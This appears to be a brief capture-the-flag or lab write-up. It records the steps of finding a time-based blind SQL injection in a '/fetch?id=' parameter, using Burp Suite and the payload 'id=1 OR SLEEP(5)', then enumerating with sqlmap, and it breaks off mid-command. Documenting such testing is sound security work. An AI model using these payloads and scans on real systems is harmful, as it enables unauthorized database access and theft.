# Step by step
- View page source, find that the application fetch image via `/fetch?id=1`
- Manual test show that this input entry vulnerable with SQLi
- Scan with **burpsuite**, this entry has time-based blind SQLi `fetch?id=1%20OR%20SLEEP(5)`
- Used **sqlmap** scan reveal that the app use MySQL. `sqlmap -u 'https://url/fetch?id=1`
- Continue scanning with sqlmap `sqlmap -u 'https://url/fetch?id=1' --dbms=
